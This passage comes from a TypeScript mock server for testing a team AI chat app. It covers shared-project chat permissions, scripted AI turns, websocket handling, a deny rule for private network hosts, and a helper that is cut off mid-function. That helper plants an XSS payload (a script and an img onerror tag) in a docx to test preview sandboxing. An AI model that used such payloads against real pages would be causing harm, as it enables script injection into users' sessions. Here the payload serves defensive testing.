      this.speechChosen = body.chosen !== false
    }
    else if (p === '/__test/transcribe-chats') return Response.json(this.transcribeChats)
    else if (p === '/__test/transcribe-progress') this.transcribeProgress = { message: String(body.message), progress: typeof body.progress === 'number' ? body.progress : null, ms: Number(body.ms ?? 3000) }
    else if (p === '/__test/file') {
      // a team file for a test (POST {path, text} or {path, base64}); its folders are made too
      const path = String(body.path)
      const parts = path.split('/')
      for (let i = 1; i < parts.length; i++) { const d = parts.slice(0, i).join('/'); if (!this.files.has(d)) this.files.set(d, { type: 'folder', mtime: now() }) }
      this.putFile(path, typeof body.base64 === 'string' ? new Uint8Array(Buffer.from(body.base64, 'base64')) : String(body.text ?? ''))
    }
    else if (p === '/__test/rmdir') {
      // a folder gone from disk (moved away outside the app): its folder rows and rules stay
      const path = String(body.path)
      for (const k of [...this.files.keys()]) if (k === path || k.startsWith(path + '/')) this.files.delete(k)
    }
    else if (p === '/__test/download-only') {
      this.putFile(String(body.path), 'PK generated deck')
      this.downloadOnly.add(String(body.path))
    }
    else if (p === '/__test/artifact') this.nextArtifact = { type: (['html', 'svg', 'react', 'mermaid'] as const).find((t) => t === body.type) ?? 'html', content: String(body.content) }
    else if (p === '/__test/skills') {
      // skill files: [{path, name, description}] (a name header each), e.g. skills/weekly.md or users/bob/skills/x.md
      for (const f of (body.files as { path: string; name: string; description?: string; title?: string }[]) ?? []) {
        for (let d = f.path.lastIndexOf('/'); d > 0; d = f.path.lastIndexOf('/', d - 1)) this.files.set(f.path.slice(0, d), this.files.get(f.path.slice(0, d)) ?? { type: 'folder', mtime: now() })
        this.putFile(f.path, `---\nname: ${f.name}\ndescription: ${f.description ?? ''}\n${f.title ? `metadata:\n  title: ${f.title}\n` : ''}---\n${f.name} steps\n`)
      }
    }
    else if (p === '/__test/rooms') {
      // session markers (docs/DECISIONS.md): rooms as GET /api/rooms lists them (unread counts, "@", the AI waiting on
      // me); each one is sent like the server's room.updated
      this.rooms = (body.rooms as unknown[]).map((r) => Room.parse(r))
      for (const r of this.rooms) this.publish({ type: 'room.updated', data: { roomId: r.id, change: 'updated', room: r } })
    }
    else if (p === '/__test/share-changed') {
      // something changed since the last "confirm" (someone joined, lost access): its key is stale
      this.shareEpoch++
    }
    else if (p === '/__test/revoke') {
      // like the server after a folder-rule change: the folder is gone for everyone, who get an access_changed notice
      this.revoked.add(String(body.path))
      this.publish({ type: 'notice', data: { level: 'info', code: 'access_changed', message: String(body.path) } })
    }
    return Response.json({ ok: true })
  }

  // ---------------- shared project chats (docs/DECISIONS.md "Shared project chats") ----------------
  // Like server/src/chat/shared.ts, short, as one layer over the handlers above (installSharedChats, run once when the
  // mock is made). A project's setting (PATCH /api/projects/:id {shareChats}; 409 project_personal / safe_ops /
  // project_in_trash), its audience (the active people who can read its folder) and its shared chats (not in the trash);
  // a chat made in a project whose setting is on is a shared chat. Each viewer gets their own Chat.shared (who made it,
  // the audience, `answering`: someone else's turn, `waiting` while its read card is open; `mine`: made it or wrote in it;
  // `canDelete`: its creator or a project editor). GET /api/chats has the shared chats I wrote in; ?projectId= every shared
  // chat of the project I can see. A turn there is a short scripted one of its sender: its deltas, steps, cards and end go
  // to that person's windows only, chat.updated to everyone who sees the chat (each their own view). "readcard" in the
  // message: the read card (읽고 공유하기 / 읽지 않기) for finance/2026/q3.csv before the answer; "hold": the answer waits
  // until POST /__test/shared-release {chatId?}. The refusals: 409 shared_chat_busy / safe_ops / shared_chat_upload /
  // shared_chat_move, 403 shared_chat_creator / shared_chat_runner / shared_chat_own_messages / shared_chat_manage.
  sharedProjects = new Set<string>()
  sharedChats = new Map<string, { by: { id: string; name: string }; projectId: string; runner: string | null; waiting: boolean }>()
  /** who made each chat made here: a chat of one person is theirs alone, like chatFor (the handlers above have no owners) */
  chatOwners = new Map<string, string>()
  sharedHolds = new Map<string, () => void>()
  /** (the layer is in place; set while the mock is made, after the handlers above) */
  readonly sharedInstalled = this.installSharedChats()

  sharedAudience(p: Project): User[] {
    return this.users.filter((u) => u.status === 'active' && this.access(p.folderPath, u) !== 'none')
  }
  /** like server/src/chat/projects.ts mayEditProject: its creator, or an admin who can write its folder */
  sharedMayEdit(p: Project, u: User): boolean {
    return p.createdBy?.id === u.id || (u.role !== 'member' && this.access(p.folderPath, u) === 'write')
  }
  sharedProjectOut(p: Project): Project {
    const personal = p.folderPath.startsWith('users/')
    return { ...p, shareChats: !personal && this.sharedProjects.has(p.id), audience: this.sharedAudience(p).length,
      sharedChats: this.chats.filter((c) => c.projectId === p.id && !c.deletedAt && this.sharedChats.has(c.id)).length }
  }
  /** The chat as `viewer` sees it (null: they cannot see its project); a chat of one person as it is. */
  sharedView(chat: Chat, viewer: User): Chat | null {
    const s = this.sharedChats.get(chat.id)
    if (!s) return chat
    const p = this.projects.find((x) => x.id === s.projectId)
    if (!p || this.access(p.folderPath, viewer) === 'none') return null
    const { waiting: _w, unseen: _u, shared: _s, ...rest } = chat
    const runner = s.runner && s.runner !== viewer.id ? this.users.find((u) => u.id === s.runner) : undefined
    return {
      ...rest,
      ...(s.runner === viewer.id && s.waiting ? { waiting: true as const } : {}),
      ...(chat.unseen && s.by.id === viewer.id ? { unseen: true as const } : {}),
      shared: {
        by: s.by,
        audience: this.sharedAudience(p).length,
        answering: runner ? { name: runner.name, ...(s.waiting ? { waiting: true as const } : {}) } : null,
        mine: s.by.id === viewer.id || this.messages.some((m) => m.chatId === chat.id && m.role === 'user' && m.author?.id === viewer.id),
        canDelete: s.by.id === viewer.id || this.sharedMayEdit(p, viewer),
      },
    }
  }
  /** One event per window, each made for that window's person (null: none for them); seq goes on as for any event. */
  sharedSend(make: (userId: string) => ServerEventInput | null) {
    for (const ws of this.sockets) {
      const ev = make(ws.data.user)
      if (!ev) continue
      const full = { ...ev, seq: ++this.seq, at: Date.now() }
      ServerEvent.parse(full)
      ws.send(JSON.stringify(full))
    }
  }

  private installSharedChats() {
    const h = this.handlers
    const over = (name: ApiName, fn: (c: Ctx, base: Handler) => unknown) => {
      const base = h[name]!
      h[name] = (c) => fn(c, base)
    }
    const shared = (id: string | undefined) => (id ? this.sharedChats.get(id) : undefined)
    const chatOf = (id: string) => this.chats.find((x) => x.id === id) ?? fail('not_found', 404)
    const view = (chat: Chat, u: User) => this.sharedView(chat, u) ?? fail('not_found', 404)
    const nameOf = (id: string) => this.users.find((u) => u.id === id)?.name ?? ''
    const project = (s: { projectId: string }) => this.projects.find((p) => p.id === s.projectId)

    const baseReset = this.reset.bind(this)
    this.reset = (o) => {
      for (const release of this.sharedHolds.values()) release()
      this.sharedProjects = new Set()
      this.sharedChats = new Map()
      this.chatOwners = new Map()
      this.sharedHolds = new Map()
      baseReset(o)
    }
    // the events of a shared chat: chat.updated to everyone who sees it (their own view), the rest to the runner
    const basePublish = this.publish.bind(this)
    this.publish = (ev) => {
      const chatId = (ev.data as { chatId?: unknown }).chatId
      const s = typeof chatId === 'string' ? this.sharedChats.get(chatId) : undefined
      if (!s) return basePublish(ev)
      if (ev.type === 'chat.updated') {
        const d = ev.data
        const p = project(s)
        return this.sharedSend((uid) => {
          const u = this.users.find((x) => x.id === uid)
          if (!u) return null
          if (!d.chat) return p && this.access(p.folderPath, u) !== 'none' ? ev : null
          const v = this.sharedView(d.chat, u)
          return v ? ({ ...ev, data: { ...d, chat: v } } as ServerEventInput) : null
        })
      }
      const to = s.runner ?? s.by.id
      return this.sharedSend((uid) => (uid === to ? ev : null))
    }
    const baseControl = this.testControl.bind(this)
    this.testControl = async (p, req) => {
      if (p !== '/__test/shared-release') return baseControl(p, req)
      const body = (await req.json().catch(() => ({}))) as { chatId?: string }
      for (const [id, release] of [...this.sharedHolds]) if (!body.chatId || body.chatId === id) { this.sharedHolds.delete(id); release() }
      return Response.json({ ok: true })
    }

    over('listProjects', (c, base) => ({ items: (base(c) as { items: Project[] }).items.map((p) => this.sharedProjectOut(p)) }))
    over('getProject', (c, base) => this.sharedProjectOut(base(c) as Project))
    over('updateProject', (c, base) => {
      const p = this.projects.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      const { shareChats, ...rest } = c.body as { shareChats?: boolean }
      if (shareChats !== undefined) {
        if (p.folderPath.startsWith('users/')) fail('conflict', 409, '개인 프로젝트의 채팅은 공유할 수 없어요.', { 'body.shareChats': 'project_personal' }, { reason: 'project_personal' })
        if (shareChats && this.allConfidential) fail('conflict', 409, '안전 작업 모드에서는 채팅을 공유할 수 없어요.', { 'body.shareChats': 'safe_ops' }, { reason: 'safe_ops' })
        if (p.inTrash) fail('conflict', 409, '폴더가 휴지통에 있는 프로젝트예요.', { 'body.shareChats': 'project_in_trash' }, { reason: 'project_in_trash' })
        if (shareChats) this.sharedProjects.add(p.id)
        else this.sharedProjects.delete(p.id)
      }
      return this.sharedProjectOut(base({ ...c, body: rest }) as Project)
    })
    // its shared chats go with it, for good
    over('deleteProject', (c, base) => {
      const gone = this.chats.filter((x) => x.projectId === c.params.id && this.sharedChats.has(x.id))
      for (const x of gone) this.publish({ type: 'chat.updated', data: { chatId: x.id, change: 'purged', chat: null } })
      for (const x of gone) this.sharedChats.delete(x.id)
      this.chats = this.chats.filter((x) => !gone.includes(x))
      return base(c)
    })

    /** a chat of one person made here by someone else: not this viewer's to see */
    const othersPrivate = (id: string, u: User) => !this.sharedChats.has(id) && (this.chatOwners.get(id) ?? u.id) !== u.id
    over('listChats', (c, base) => {
      const out = base(c) as { items: Chat[]; nextCursor: string | null }
      const items = out.items.flatMap((x) => {
        if (othersPrivate(x.id, c.user)) return []
        if (!this.sharedChats.has(x.id)) return [x]
        const v = this.sharedView(x, c.user)
        if (!v) return []
        if (x.deletedAt) return v.shared!.canDelete ? [v] : []
        return c.query.projectId || v.shared!.mine ? [v] : []
      })
      return { ...out, items }
    })
    over('createChat', (c, base) => {
      const out = base(c) as { status: number; body: Chat }
      this.chatOwners.set(out.body.id, c.user.id)
      const p = c.body.projectId ? this.projects.find((x) => x.id === c.body.projectId) : undefined
      if (!p || !this.sharedProjects.has(p.id) || p.folderPath.startsWith('users/') || p.inTrash || this.allConfidential) return out
      this.sharedChats.set(out.body.id, { by: { id: c.user.id, name: c.user.name }, projectId: p.id, runner: null, waiting: false })
      this.publish({ type: 'chat.updated', data: { chatId: out.body.id, change: 'created', chat: out.body } })
      return { ...out, body: view(out.body, c.user) }
    })
    over('getChat', (c, base) => {
      const x = base(c) as Chat
      if (othersPrivate(x.id, c.user)) fail('not_found', 404)
      return this.sharedChats.has(x.id) ? view(x, c.user) : x
    })
    over('listMessages', (c, base) => {
      if (shared(c.params.id)) view(chatOf(c.params.id!), c.user)
      else if (othersPrivate(c.params.id!, c.user)) fail('not_found', 404)
      return base(c)
    })
    over('markChatSeen', (c, base) => {
      const s = shared(c.params.id)
      if (!s) return base(c)
      const x = view(chatOf(c.params.id!), c.user)
      return s.by.id === c.user.id ? view(base(c) as Chat, c.user) : x
    })
    over('updateChat', (c, base) => {
      const s = shared(c.params.id)
      if (!s) return base(c)
      const chat = view(chatOf(c.params.id!), c.user)
      if (s.by.id !== c.user.id) fail('forbidden', 403, '공유 채팅의 이름과 엔진은 만든 사람만 바꿀 수 있어요.', undefined, { reason: 'shared_chat_creator' })
      if (c.body.projectId !== undefined && c.body.projectId !== chat.projectId) fail('conflict', 409, '공유 채팅은 다른 프로젝트로 옮길 수 없어요.', { 'body.projectId': 'shared_chat_move' }, { reason: 'shared_chat_move' })
      const out = base(c) as Chat
      this.publish({ type: 'chat.updated', data: { chatId: out.id, change: 'updated', chat: out } })
      return view(out, c.user)
    })
    over('deleteChat', (c, base) => {
      const s = shared(c.params.id)
      if (!s) return base(c)
      if (!view(chatOf(c.params.id!), c.user).shared!.canDelete) fail('forbidden', 403, '공유 채팅은 만든 사람이나 프로젝트를 고칠 수 있는 사람만 지울 수 있어요.', undefined, { reason: 'shared_chat_manage' })
      const out = base(c)
      this.publish({ type: 'chat.updated', data: { chatId: c.params.id!, change: 'deleted', chat: null } })
      return out
    })
    over('restoreChat', (c, base) => {
      const s = shared(c.params.id)
      if (!s) return base(c)
      if (!view(chatOf(c.params.id!), c.user).shared!.canDelete) fail('forbidden', 403, '공유 채팅은 만든 사람이나 프로젝트를 고칠 수 있는 사람만 지울 수 있어요.', undefined, { reason: 'shared_chat_manage' })
      const out = base(c) as Chat
      this.publish({ type: 'chat.updated', data: { chatId: out.id, change: 'restored', chat: out } })
      return view(out, c.user)
    })
    over('listTurnRequests', (c, base) => {
      const s = shared(c.params.id)
      return s && s.runner !== c.user.id ? { items: [] } : base(c)
    })
    over('answerTurn', (c, base) => {
      const open = this.openAsks.get(c.params.id!)
      const s = open ? shared(open.chatId) : undefined
      if (s && s.runner !== c.user.id) fail('forbidden', 403, '질문한 사람만 이 카드에 답할 수 있어요.')
      return base(c)
    })
    // a shared chat takes team files only
    over('uploadAttachment', (c, base) => {
      if (shared((c.body as { chatId?: string }).chatId)) fail('conflict', 409, '공유 채팅에는 팀 파일만 붙일 수 있어요. 컴퓨터의 파일은 프로젝트 폴더에 올린 뒤 붙여 주세요.', undefined, { reason: 'shared_chat_upload' })
      return base(c)
    })
    over('createUploadSession', (c, base) => {
      const target = c.body.target as { kind: string; chatId?: string }
      if (target.kind === 'attachment' && shared(target.chatId)) fail('conflict', 409, '공유 채팅에는 팀 파일만 붙일 수 있어요. 컴퓨터의 파일은 프로젝트 폴더에 올린 뒤 붙여 주세요.', undefined, { reason: 'shared_chat_upload' })
      return base(c)
    })

    /** one turn at a time: someone else's (409 shared_chat_busy, naming them) or my own */
    const notBusy = (s: { runner: string | null }, u: User) => {
      if (s.runner && s.runner !== u.id) fail('conflict', 409, `${nameOf(s.runner)}님의 질문에 답하는 중이에요. 끝나면 보낼 수 있어요.`, undefined, { reason: 'shared_chat_busy' })
      if (s.runner) fail('conflict', 409, '이 채팅은 아직 답하는 중이에요.')
    }
    const mayContinue = (u: User, chatId: string) => {
      view(chatOf(chatId), u)
      if (this.allConfidential) fail('conflict', 409, '안전 작업 모드라서 공유 채팅을 이어갈 수 없어요. 내 채팅에서 물어봐 주세요.', undefined, { reason: 'safe_ops' })
    }
    const teamOnly = (ids: string[]) => {
      const atts = ids.map((id) => this.attachments.get(id)).filter((a): a is NonNullable<typeof a> => !!a)
      if (atts.some((a) => a.source !== 'team')) fail('conflict', 409, '공유 채팅에는 팀 파일만 붙일 수 있어요. 컴퓨터의 파일은 프로젝트 폴더에 올린 뒤 붙여 주세요.', undefined, { reason: 'shared_chat_upload' })
      return atts.map(({ data: _d, ...rest }) => rest)
    }
    const ownOnly = (m: Message | undefined, u: User) => {
      if (m?.author?.id !== u.id) fail('forbidden', 403, '공유 채팅에서는 내 메시지만 고치거나 다시 답하게 할 수 있어요.', undefined, { reason: 'shared_chat_own_messages' })
    }
    const started = (user: Message | null, assistant: Message) => ({ status: 202, body: { userMessage: user ? this.view(user) : null, assistantMessage: this.view(assistant), turnId: assistant.turnId, queuePosition: 0, queueEpoch: this.epoch, queueRevision: this.queueRevision } })

    over('sendMessage', (c, base) => {
      const s = shared(c.params.id)
      if (!s) return base(c)
      const again = this.messages.find((m) => (m as Message & { cmid?: string }).cmid === c.body.clientMessageId)
      if (again) fail('conflict', 409)
      mayContinue(c.user, c.params.id!)
      notBusy(s, c.user)
      const chat = chatOf(c.params.id!)
      const attachments = teamOnly(c.body.attachmentIds as string[])
      const parentId = c.body.parentId ?? this.activeLeaf.get(chat.id) ?? null
      const user = this.message({ chatId: chat.id, role: 'user', parentId, content: c.body.content, attachments, author: { id: c.user.id, name: c.user.name } })
      ;(user as Message & { cmid?: string }).cmid = c.body.clientMessageId
      return started(user, this.sharedTurn(chat, c.user, c.body.content, user.id))
    })
    over('regenerate', (c, base) => {
      const s = shared(c.params.id)
      if (!s) return base(c)
      mayContinue(c.user, c.params.id!)
      const old = this.messages.find((m) => m.id === c.params.messageId) ?? fail('not_found', 404)
      const question = this.messages.find((m) => m.id === old.parentId)
      ownOnly(question, c.user)
      notBusy(s, c.user)
      return started(null, this.sharedTurn(chatOf(c.params.id!), c.user, question!.content, question!.id))
    })
    over('editMessage', (c, base) => {
      const s = shared(c.params.id)
      if (!s) return base(c)
      mayContinue(c.user, c.params.id!)
      const old = this.messages.find((m) => m.id === c.params.messageId) ?? fail('not_found', 404)
      ownOnly(old, c.user)
      notBusy(s, c.user)
      const attachments = teamOnly(c.body.attachmentIds as string[])
      const user = this.message({ chatId: old.chatId, role: 'user', parentId: old.parentId, content: c.body.content, attachments, author: { id: c.user.id, name: c.user.name } })
      return started(user, this.sharedTurn(chatOf(c.params.id!), c.user, c.body.content, user.id))
    })
    over('selectBranch', (c, base) => {
      if (shared(c.params.id)) mayContinue(c.user, c.params.id!)
      return base(c)
    })
    over('stop', (c, base) => {
      const s = shared(c.params.id)
      if (!s) return base(c)
      view(chatOf(c.params.id!), c.user)
      if (s.runner && s.runner !== c.user.id) fail('forbidden', 403, '질문한 사람만 이 답변을 멈출 수 있어요.', undefined, { reason: 'shared_chat_runner' })
      const out = base(c)
      this.sharedHolds.get(c.params.id!)?.()
      this.sharedHolds.delete(c.params.id!)
      return out
    })

    // "프로젝트 사람들과 공유" (server/src/chat/share-chat.ts, short): a chat of mine in a team project that shares its
    // chats. What its answers read (the recorded sources: "sources", "mine-source") that some of the project's other
    // people cannot open makes it ask first (how many; the folders I may open, my own folder, more I cannot); a question
    // with "memory" in it brings the memory note; `ask` asks first anyway. The key is stale after POST
    // /__test/share-changed.
    const no = (reason: string, message: string): never => fail('conflict', 409, message, undefined, { reason })
    h.shareChat = (c) => {
      const chat = chatOf(c.params.id!)
      if (this.sharedChats.has(chat.id)) { view(chat, c.user); no('already_shared', '이미 프로젝트 사람들과 공유한 채팅이에요.') }
      if (othersPrivate(chat.id, c.user) || chat.deletedAt) fail('not_found', 404)
      if (this.allConfidential || chat.confidential) no('safe_ops', '안전 작업 모드이거나 기밀 채팅이라 공유할 수 없어요.')
      const p = chat.projectId ? this.projects.find((x) => x.id === chat.projectId) : undefined
      if (!p || this.access(p.folderPath, c.user) === 'none') return no('project_not_sharing', '이 채팅은 채팅을 공유하는 팀 프로젝트에 있지 않아요. 그런 프로젝트로 옮긴 뒤에 공유해 주세요.')
      if (p.folderPath.startsWith('users/')) no('project_personal', '개인 프로젝트의 채팅은 공유할 수 없어요.')
      if (p.inTrash) no('project_in_trash', '이 프로젝트의 폴더가 휴지통에 있어요.')
      if (!this.sharedProjects.has(p.id)) no('project_not_sharing', '이 채팅은 채팅을 공유하는 팀 프로젝트에 있지 않아요. 그런 프로젝트로 옮긴 뒤에 공유해 주세요.')
      if (chat.runState !== 'idle') no('chat_busy', '답변이 아직 진행 중이에요. 끝난 뒤에 공유해 주세요.')
      const others = this.sharedAudience(p).filter((u) => u.id !== c.user.id)
      const msgs = this.messages.filter((m) => m.chatId === chat.id)
      const blind = new Set<string>()
      const places = new Map<string, AnswerSharePlace>()
      let otherPlaces = false
      for (const f of msgs.filter((m) => m.role === 'assistant').flatMap((m) => this.sources.get(m.id) ?? [])) {
        const miss = others.filter((u) => this.access(f.path, u) === 'none')
        if (!miss.length) continue
        for (const u of miss) blind.add(u.id)
        const place: AnswerSharePlace | null = f.path.startsWith(`users/${c.user.id}/`) ? { kind: 'mine' } : this.access(f.path, c.user) !== 'none' ? { kind: 'folder', path: f.path.split('/').slice(0, -1).join('/') } : null
        if (place) places.set(JSON.stringify(place), place)
        else otherPlaces = true
      }
      const memories = msgs.some((m) => m.role === 'user' && /memory/i.test(m.content))
      const confirmKey = `mock-share-${chat.id}-${this.shareEpoch}-${others.length}`
      // `ask` (the title menu): the question first even when nothing applies
      if ((blind.size || memories || c.body.ask || c.body.confirmKey !== undefined) && c.body.confirmKey !== confirmKey) {
        return {
          status: 'confirm', audience: others.length, memories, confirmKey,
          provenance: blind.size ? { people: blind.size, places: [...places.values()], otherPlaces } : null,
          ...(c.body.confirmKey !== undefined ? { reason: 'changed' as const } : {}),
        }
      }
      this.sharedChats.set(chat.id, { by: { id: c.user.id, name: c.user.name }, projectId: p.id, runner: null, waiting: false })
      chat.updatedAt = now()
      this.publish({ type: 'chat.updated', data: { chatId: chat.id, change: 'updated', chat } })
      return { status: 'shared', chat: view(chat, c.user) }
    }
    return true
  }

  /** A turn of `user` in a shared chat: the scripted answer (see above), its events to `user` only. */
  sharedTurn(chat: Chat, user: User, prompt: string, parentId: string): Message {
    const s = this.sharedChats.get(chat.id)!
    const turnId = uuidv7()
    const assistant = this.message({ chatId: chat.id, role: 'assistant', parentId, status: 'streaming', turnId, engine: chat.engine })
    this.activeLeaf.set(chat.id, assistant.id)
    s.runner = user.id
    chat.runState = 'running'
    chat.updatedAt = now()
    if (!chat.title) chat.title = prompt.slice(0, 30)
    this.queueRevision++
    this.publish({ type: 'chat.updated', data: { chatId: chat.id, change: 'updated', chat } })
    const gen = this.generation
    this.runSharedTurn(chat, user, prompt, assistant).catch((e) => { if (gen === this.generation) console.error('mock shared turn failed', e) })
    return assistant
  }

  async runSharedTurn(chat: Chat, user: User, prompt: string, assistant: Message) {
    const s = this.sharedChats.get(chat.id)!
    const chatId = chat.id
    const turnId = assistant.turnId!
    const gen = this.generation
    const pub = (ev: ServerEventInput) => {
      if (gen !== this.generation) throw new Error('mock was reset')
      this.publish(ev)
    }
    const put = (st: Step) => {
      assistant.steps = [...assistant.steps.filter((x) => x.id !== st.id), st]
      pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: st } })
    }
    await sleep(60)
    pub({ type: 'queue.position', data: { chatId, messageId: assistant.id, turnId, position: 0, epoch: this.epoch, revision: ++this.queueRevision } })
    let text = '네, 정리했어요.\n\n- 출시는 다음 주 화요일이에요.\n- 안내 문구는 마케팅 폴더의 계획을 따라요.'
    if (/readcard/i.test(prompt)) {
      // like chat/turn.ts confirmSharedRead: a place some of the chat's people cannot read waits for the sender's yes
      const read: Step = { id: 'r1', kind: 'tool', tool: 'read', label: '파일 읽기 · finance/2026/q3.csv', status: 'running', startedAt: now(), endedAt: null }
      put(read)
      const people = this.sharedAudience(this.projects.find((p) => p.id === s.projectId)!)
      const blind = people.filter((u) => this.access('finance/2026/q3.csv', u) === 'none').length
      const requestId = `shared-read-${turnId}`
      const request: TurnRequest = {
        kind: 'ask_user', origin: 'server', requestId, allowText: false, multiple: false,
        question: `AI가 finance/2026/q3.csv을(를) 읽으려고 해요. 이 채팅을 보는 프로젝트 사람 ${people.length}명 중 ${blind}명은 이곳을 볼 수 없어요. 읽으면 모두가 이 채팅에서 내용을 보게 돼요.`,
        options: [{ label: '읽고 공유하기', value: 'share' }, { label: '읽지 않기', value: 'skip' }],
        expiresAt: new Date(Date.now() + 600_000).toISOString(),
      }
      this.openAsks.set(turnId, { turnId, chatId, messageId: assistant.id, request })
      s.waiting = true
      pub({ type: 'turn.request', data: { turnId, chatId, messageId: assistant.id, request } })
      pub({ type: 'chat.updated', data: { chatId, change: 'updated', chat, notify: 'card' } })
      const answer = await new Promise((r) => this.pendingAsk.set(turnId, r))
      if (gen !== this.generation) return
      this.openAsks.delete(turnId)
      s.waiting = false
      // (no chatId in it: to the runner here)
      this.sharedSend((uid) => (uid === user.id ? { type: 'turn.request.closed', data: { turnId, requestId, reason: 'answered' } } : null))
      pub({ type: 'chat.updated', data: { chatId, change: 'updated', chat } })
      const yes = answer === 'share' || (Array.isArray(answer) && answer[0] === 'share')
      put({ ...read, status: 'ok', endedAt: now(), ...(yes ? {} : { label: '프로젝트 사람 모두가 볼 수는 없는 곳이라 읽지 않았어요' }) })
      text = yes ? '3분기 금액은 100이에요 (finance/2026/q3.csv).' : '그 파일은 읽지 않았어요. 프로젝트 사람 모두가 볼 수 있는 자료로만 답할게요.'
    }
    if (/hold/i.test(prompt) && !this.stopped.has(turnId)) await new Promise<void>((r) => this.sharedHolds.set(chatId, r))
    if (gen !== this.generation) return
    if (!this.stopped.has(turnId)) {
      const half = Math.ceil(text.length / 2)
      pub({ type: 'message.delta', data: { chatId, messageId: assistant.id, offset: 0, text: text.slice(0, half) } })
      await sleep(30)
      pub({ type: 'message.delta', data: { chatId, messageId: assistant.id, offset: half, text: text.slice(half) } })
      assistant.content = text
    }
    assistant.status = this.stopped.has(turnId) ? 'stopped' : 'done'
    assistant.usage = { inputTokens: 100, outputTokens: 50, costUsd: 0.001 }
    assistant.model = 'claude-sonnet'
    assistant.engine = 'claude-code'
    pub({ type: 'message.done', data: { chatId, messageId: assistant.id, status: assistant.status, message: this.view(assistant) } })
    s.runner = null
    chat.runState = 'idle'
    chat.updatedAt = now()
    this.queueRevision++
    pub({ type: 'chat.updated', data: { chatId, change: 'updated', chat } })
  }

  serve(port: number, dist: string) {
    const self = this
    return Bun.serve<WsData, never>({
      port,
      hostname: '127.0.0.1',
      async fetch(req, server) {
        const url = new URL(req.url)
        if (url.pathname === WS_PATH) {
          const user = self.userOf(req)
          const after = url.searchParams.get('after')
          const data: WsData = { user: user?.id ?? '', windowId: url.searchParams.get('windowId') ?? '', epoch: url.searchParams.get('epoch'), after: after === null ? null : Number(after) }
          const ok = server.upgrade(req, { data, headers: { 'sec-websocket-protocol': 'mycel.v1' } })
          return ok ? undefined : new Response('upgrade failed', { status: 400 })
        }
        return self.handle(req, dist)
      },
      websocket: {
        open(ws) {
          if (!ws.data.user) return ws.close(WsClose.unauthorized, 'sign in')
          self.sockets.add(ws)
          const hello = (resumed: boolean) => JSON.stringify({ type: 'hello', epoch: self.epoch, seq: self.seq, resumed, windowId: ws.data.windowId, serverVersion: self.serverVersion, pingIntervalMs: 20000 })
          const { epoch, after } = ws.data
          if (epoch && epoch !== self.epoch) {
            ws.send(hello(false))
            ws.send(JSON.stringify({ type: 'reset', epoch: self.epoch, seq: self.seq, reason: 'epoch_mismatch' }))
          } else if (epoch && after !== null) {
            const oldest = self.buffer[0]?.seq ?? self.seq + 1
            if (after + 1 < oldest) {
              ws.send(hello(false))
              ws.send(JSON.stringify({ type: 'resync', epoch: self.epoch, seq: self.seq, reason: 'buffer_overflow' }))
            } else {
              ws.send(hello(true))
              for (const b of self.buffer) if (b.seq > after) ws.send(b.text)
            }
          } else ws.send(hello(false))
        },
        message(ws, msg) {
          const f = JSON.parse(String(msg)) as { type: string; t?: number }
          if (f.type === 'ping') ws.send(JSON.stringify({ type: 'pong', t: f.t ?? 0 }))
        },
        close(ws) {
          self.sockets.delete(ws)
        },
      },
    })
  }
}

function mimeOf(path: string): string | null {
  const e = path.toLowerCase().split('.').pop() ?? ''
  return ({ md: 'text/markdown', csv: 'text/csv', txt: 'text/plain', html: 'text/html', png: 'image/png', jpg: 'image/jpeg', pdf: 'application/pdf', json: 'application/json' } as Record<string, string>)[e] ?? null
}

type MockIntegration = Omit<Integration, 'hasSecret' | 'canManage'> & { ownerId: string | null; checks: number; disabledTools: string[] }
const NO_ACCESS: IntegrationAccess = { everyone: false, groups: [], users: [] }
/** what the fake MCP server offers: two tools at first, a third once it is checked again */
const FAKE_MCP_TOOLS: IntegrationTool[] = [
  { name: 'search_pages', title: 'Search pages', description: 'Find pages by words in their title or text.', readOnly: true },
  { name: 'create_page', title: 'Create page', description: 'Create a new page in a workspace.', readOnly: false },
  { name: 'get_page', title: null, description: 'Read one page with its blocks.', readOnly: true },
]
/** like server/src/web-fetch.ts resolveTarget (by name only here): this computer and office networks are refused */
const privateHost = (h: string) => h === 'localhost' || h.endsWith('.localhost') || h.endsWith('.local') || h.endsWith('.internal') || /^(127|10)\./.test(h) || /^192\.168\./.test(h) || /^172\.(1[6-9]|2\d|3[01])\./.test(h) || h === '[::1]'

function defaultSettings(): TeamSettings {
  return { teamName: 'Acme', defaultLocale: 'ko', defaultEngine: 'claude-code', defaultModel: null, concurrency: 2, updateChannel: 'stable', updateWindow: null, auditRetentionDays: 365, fileHistoryRetentionDays: 90, trashRetentionDays: 30, chatTrashRetentionDays: 7, timeZone: 'Asia/Seoul', browserAllowAll: true, personalIntegrations: true, aiVision: true, aiSubagents: true, answerStepLimit: 150, speechProvider: 'local', speechModel: 'openai/whisper-large-v3-turbo', aiMediaTranscripts: null, introDeckTier: 'standard' }
}

/** What the real server's securityHeaders() middleware adds to every non-/api response (server/src/http/middleware.ts). */
function pageHeaders(res: Response): Response {
  const h = new Headers(res.headers)
  h.set('X-Content-Type-Options', 'nosniff')
  h.set('Referrer-Policy', 'same-origin')
  h.set('X-Frame-Options', 'DENY')
  h.set('Cross-Origin-Opener-Policy', 'same-origin')
  return new Response(res.body, { status: res.status, headers: h })
}

/** Playwright's Chromium (its headless shell) kills the page's renderer as soon as a service worker calls the Badging
 * API; Chrome, full Chromium and Electron do not. web/pwa/sw.js clears the icon badge whenever the account changes
 * (`push.invalidate`, sent at every sign-out), so the worker served here gets no-op setAppBadge / clearAppBadge in
 * front of it and is otherwise the built file. Its badge logic is tested in test/unit/push-worker.test.ts. */
const NO_WORKER_BADGE = "for (const k of ['setAppBadge', 'clearAppBadge']) if (typeof self.navigator?.[k] === 'function') Object.defineProperty(self.navigator, k, { configurable: true, value: async () => {} });\n"
async function withoutWorkerBadge(res: Response): Promise<Response> {
  const h = new Headers(res.headers)
  h.delete('content-length')
  return new Response(NO_WORKER_BADGE + (await res.text()), { status: res.status, headers: h })
}

/** pandoc's docx with an altChunk (an HTML part docx-preview would draw in an unsandboxed srcdoc iframe). */
function withAltChunk(docx: string): boolean {
  const dir = `${docx}.d`
  try {
    fs.rmSync(dir, { recursive: true, force: true })
    if (Bun.spawnSync(['unzip', '-q', docx, '-d', dir]).exitCode !== 0) return false
    fs.writeFileSync(`${dir}/word/chunk.html`, '<html><body><p>alt chunk</p><script>top.document.title = "pwned-altchunk"</script><img src="x" onerror="top.document.title = \'pwned-altchunk\'"></body></html>')
    const doc = `${dir}/word/document.xml`
